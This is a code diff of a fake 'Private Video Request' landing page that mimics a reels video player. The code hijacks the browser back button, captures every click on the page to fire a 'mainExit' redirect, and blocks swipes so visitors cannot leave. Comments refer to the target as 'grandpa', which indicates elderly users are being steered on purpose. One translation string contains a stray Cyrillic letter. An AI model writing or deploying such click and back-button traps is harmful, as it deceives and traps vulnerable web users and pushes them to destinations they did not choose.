@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
   <title>(1) Private Video Request</title>
@@ -31,28 +31,21 @@
     .video-layer { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; background: #000; opacity: 0; transition: opacity 0.1s linear; pointer-events: none; }
     .video-layer.active { opacity: 1; z-index: 1; }
     .reels-ui { position: absolute; inset: 0; z-index: 10; display: flex; flex-direction: column; justify-content: space-between; pointer-events: none; background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%); }
-    .click-hint-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 50; display: none; flex-direction: column; align-items: center; justify-content: center; gap: 15px; pointer-events: none; width: 100%; }
+
+    /* кнопку чуть выше, чтобы не перекрывала UI */
+    .click-hint-overlay { position: absolute; top: 44%; left: 50%; transform: translate(-50%, -50%); z-index: 50; display: none; flex-direction: column; align-items: center; justify-content: center; gap: 15px; pointer-events: none; width: 100%; }
+
     .glass-btn { display: flex; align-items: center; gap: 12px; background: rgba(20, 20, 20, 0.45); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.15); padding: 14px 28px; border-radius: 40px; cursor: pointer; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4); animation: pulseGlass 2s infinite; pointer-events: auto; max-width: 90%; }
     .glass-btn:active { transform: scale(0.95); }
     .glass-icon { width: 24px; height: 24px; fill: white; flex-shrink: 0; }
     .glass-text { color: #fff; font-size: 16px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; text-shadow: 0 1px 2px rgba(0,0,0,0.3); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-
-    @keyframes pulseGlass {
-      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); }
-      70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); }
-      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
-    }
+    @keyframes pulseGlass { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); } 70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); } }
 
     .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
-    @keyframes shake {
-      10%, 90% { transform: translate3d(-2px, 0, 0); }
-      20%, 80% { transform: translate3d(4px, 0, 0); }
-      30%, 50%, 70% { transform: translate3d(-6px, 0, 0); }
-      40%, 60% { transform: translate3d(6px, 0, 0); }
-    }
+    @keyframes shake { 10%, 90% { transform: translate3d(-2px, 0, 0); } 20%, 80% { transform: translate3d(4px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-6px, 0, 0); } 40%, 60% { transform: translate3d(6px, 0, 0); } }
 
     .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
-    .slide-in-up  { animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; visibility: visible !important; z-index: 2 !important; }
+    .slide-in-up { animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; visibility: visible !important; z-index: 2 !important; }
     @keyframes slideOutUp { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-100%); opacity: 1; } }
     @keyframes slideInUp  { 0% { transform: translateY(100%); opacity: 1; } 100% { transform: translateY(0); opacity: 1; } }
 
@@ -61,7 +54,9 @@
     .filter-pill { background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; color: #fff; font-size: 13px; font-weight: 500; }
     .filter-icon { width: 14px; height: 14px; }
 
-    .right-actions { position: absolute; right: 8px; bottom: 100px; display: flex; flex-direction: column; align-items: center; gap: 16px; pointer-events: auto; }
+    /* actions переносим влево и чуть выше чтобы не мешали кнопке */
+    .right-actions { position: absolute; left: 8px; right: auto; bottom: 110px; display: flex; flex-direction: column; align-items: center; gap: 16px; pointer-events: auto; }
+
     .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; }
     .icon-circle { width: 44px; height: 44px; background: rgba(30, 30, 30, 0.65); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(2px); margin-bottom: 2px; }
     .action-icon { width: 24px; height: 24px; }
@@ -69,68 +64,29 @@
     .dots-menu { display: flex; gap: 4px; margin-top: 10px; opacity: 0.8; }
     .dot { width: 4px; height: 4px; background: #fff; border-radius: 50%; }
 
-    .bottom-info { padding: 16px; color: #fff; margin-right: 60px; pointer-events: auto; }
+    /* раз actions слева — компенсируем нижний блок */
+    .bottom-info { padding: 16px; color: #fff; margin-right: 0; margin-left: 60px; pointer-events: auto; }
+
     .user-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
     .avatar { width: 32px; height: 32px; border-radius: 50%; background: #ff0050; border: 1px solid rgba(255,255,255,0.5); transition: background-color 0.3s; }
     .username { font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
     .desc { font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
 
-    .swipe-hint { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 20; pointer-events: none; display: flex; flex-direction: column; align-items: center; }
-    .hand-icon { font-size: 50px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); animation: swipeUp 1.8s infinite ease-in-out; }
-    @keyframes swipeUp { 0% { transform: translateY(40px); opacity: 0; } 40% { opacity: 1; } 80% { opacity: 0; } 100% { transform: translateY(-60px); opacity: 0; } }
-
-    /* ==========================
-       NEW: BIG "FOR DED" NEXT BUTTON
-       (old player style, not centered)
-    =========================== */
-    .next-btn {
-      position: absolute;
-      right: 18px;
-      bottom: 140px; /* рядом с правыми экшенами, но чуть отдельной кнопкой */
-      width: 78px;
-      height: 78px;
-      border-radius: 999px;
-      border: 2px solid rgba(255,255,255,0.25);
-      background: rgba(0,0,0,0.60);
-      backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
-      box-shadow: 0 20px 60px rgba(0,0,0,0.60);
-      z-index: 80;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      pointer-events: auto;
-      animation: nextPulse 1.8s infinite;
-    }
-    .next-btn:active { transform: scale(0.95); }
-    .next-btn svg { width: 36px; height: 36px; fill: #fff; transform: translateX(3px); filter: drop-shadow(0 2px 12px rgba(0,0,0,0.6)); }
-    .next-btn.hidden { display: none; }
-
-    @keyframes nextPulse {
-      0%   { transform: scale(1);    box-shadow: 0 20px 60px rgba(0,0,0,0.60), 0 0 0 0 rgba(255,255,255,0.18); }
-      70%  { transform: scale(1.07); box-shadow: 0 20px 60px rgba(0,0,0,0.60), 0 0 0 18px rgba(255,255,255,0); }
-      100% { transform: scale(1);    box-shadow: 0 20px 60px rgba(0,0,0,0.60), 0 0 0 0 rgba(255,255,255,0); }
-    }
+    /* рука теперь указывает вправо на кнопку */
+    .swipe-hint { position: absolute; top: 44%; left: 18%; transform: translate(-50%, -50%); z-index: 55; pointer-events: none; display: flex; flex-direction: column; align-items: center; }
+    .hand-icon { font-size: 46px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); animation: hintRight 1.6s infinite ease-in-out; }
+    @keyframes hintRight { 0% { transform: translateX(-10px); opacity: 0; } 25% { opacity: 1; } 70% { transform: translateX(55px); opacity: 1; } 100% { transform: translateX(70px); opacity: 0; } }
   </style>
 
-  <script defer src="./assets/scripts/common.js?v=2.1"></script>
+  <script defer src="./assets/scripts/common.js?v=2.0"></script>
 </head>
 
 <body>
   <div class="reels-wrapper" id="click-trap">
-
     <video id="v1" class="video-layer active" playsinline webkit-playsinline muted loop preload="auto"></video>
     <video id="v2" class="video-layer" playsinline webkit-playsinline muted loop preload="auto"></video>
 
-    <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">👆</div></div>
-
-    <!-- NEW: NEXT BUTTON (stage1 -> stage2) -->
-    <button id="next-btn" class="next-btn" type="button" aria-label="Next">
-      <svg viewBox="0 0 24 24" aria-hidden="true">
-        <path d="M9 6l9 6-9 6V6z"></path>
-      </svg>
-    </button>
+    <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">👉</div></div>
 
     <div id="click-hint" class="click-hint-overlay">
       <div class="glass-btn" data-mt="mainExit" data-stop="1">
@@ -201,7 +157,7 @@
 
       const translations = {
         en: "Continue Watching", ru: "Смотреть дальше", es: "Continuar viendo", de: "Weiter ansehen",
-        fr: "Continuer à regarder", pt: "Continuar assistindo", it: "Continua a guardare", tr: "İzlemeye devam et",
+        fr: "Continuer à regarder", pt: "Continuar assistindo", it: "Continua a guardare", tr: "İзlemeye devam et",
         ar: "متابعة المشاهدة", zh: "继续观看", ja: "視聴を続ける", ko: "계속 시청하기", hi: "देखना जारी रखें",
         id: "Lanjutkan Menonton", vi: "Tiếp tục xem", th: "ดูต่อ"
       };
@@ -215,8 +171,7 @@
       const v2 = document.getElementById('v2');
       const swipeHint = document.getElementById("swipe-hint");
       const clickHint = document.getElementById("click-hint");
-      const wrapper = document.getElementById('click-trap');
-      const nextBtn = document.getElementById("next-btn");
+      const wrapper = document.querySelector('.reels-wrapper');
 
       const uiUser = document.getElementById('ui-username');
       const uiLikes = document.getElementById('ui-likes');
@@ -233,24 +188,31 @@
       v2.load();
 
       let stage = 1;
+      let touchStartY = 0;
+      let touchEndY = 0;
       let isAnimating = false;
+
+      function vib(ms) {
+        try { if (navigator.vibrate) navigator.vibrate(ms); } catch(e) {}
+      }
 
       function armBackTrap() {
         if (window.__BACK_ARMED_ON_STAGE2__) return;
+
         try {
           if (window.LANDING_EXITS?.initBack) {
             window.LANDING_EXITS.initBack();
             window.__BACK_ARMED_ON_STAGE2__ = true;
-            return;
+          } else {
+            const tick = setInterval(() => {
+              if (window.LANDING_EXITS?.initBack) {
+                window.LANDING_EXITS.initBack();
+                window.__BACK_ARMED_ON_STAGE2__ = true;
+                clearInterval(tick);
+              }
+            }, 50);
+            setTimeout(() => clearInterval(tick), 2000);
           }
-          const tick = setInterval(() => {
-            if (window.LANDING_EXITS?.initBack) {
-              window.LANDING_EXITS.initBack();
-              window.__BACK_ARMED_ON_STAGE2__ = true;
-              clearInterval(tick);
-            }
-          }, 50);
-          setTimeout(() => clearInterval(tick), 2000);
         } catch(e) {}
       }
 
@@ -275,69 +237,58 @@
         setTimeout(() => {
           v1.classList.remove('active', 'slide-out-up');
           v1.pause();
-
           v2.classList.add('active');
           v2.classList.remove('slide-in-up');
-
           clickHint.style.display = 'flex';
-
           stage = 2;
           isAnimating = false;
-
-          // stage2: hide "next"
-          nextBtn.classList.add("hidden");
         }, 450);
       }
 
-      function goStage2FromClick() {
-        if (stage !== 1) return;
-        armBackTrap();   // важное: арми BEFORE swap
-        doSwap();
-      }
-
-      // ----------------------------
-      // 1) NEXT BUTTON: stage1 -> stage2
-      // ----------------------------
-      nextBtn.addEventListener("click", (e) => {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        goStage2FromClick();
-      }, true);
-
-      // ----------------------------
-      // 2) SWIPE: BLOCK stage change, just SHAKE button
-      // ----------------------------
-      let touchStartY = 0;
+      let suppressClickUntil = 0;
 
       wrapper.addEventListener('touchstart', (e) => {
         touchStartY = e.changedTouches[0].screenY;
       }, { passive: true });
 
+      // свайп больше НЕ переводит stage. Свайп = вибрация + подсказка "жми кнопку"
       wrapper.addEventListener('touchend', (e) => {
-        const touchEndY = e.changedTouches[0].screenY;
+        touchEndY = e.changedTouches[0].screenY;
 
-        // swipe up
-        if ((touchStartY - touchEndY) > 50 && stage === 1) {
-          // дед свайпает -> трясем "кнопку-вперед"
-          nextBtn.classList.remove('shake');
-          void nextBtn.offsetWidth;
-          nextBtn.classList.add('shake');
+        if (touchStartY - touchEndY > 50) {
+          vib(25);
+
+          if (stage === 1) {
+            // показываем кнопку и руку-наводку
+            clickHint.style.display = 'flex';
+            swipeHint.style.display = 'flex';
+            return;
+          }
+
+          // stage 2: блокируем свайп и трясем кнопку
+          const btn = document.querySelector('.glass-btn');
+          if (btn) {
+            btn.classList.remove('shake');
+            void btn.offsetWidth;
+            btn.classList.add('shake');
+          }
         }
-      }, { passive: true });
+      });
 
-      // ----------------------------
-      // 3) CLICK: stage1 -> stage2, stage2 -> mainExit
-      // ----------------------------
       wrapper.addEventListener("click", (e) => {
-        // if click on any mini-trigger element — let common.js handle it
+        if (Date.now() < suppressClickUntil) {
+          e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+          return;
+        }
         if (e.target?.closest?.("[data-mt]")) return;
 
         if (stage === 1) {
           e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-          goStage2FromClick();
+          armBackTrap();
+          doSwap();
           return;
         }
 
-        // stage2: any click -> mainExit
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         window.LANDING_EXITS?.run?.("mainExit");
       }, true);
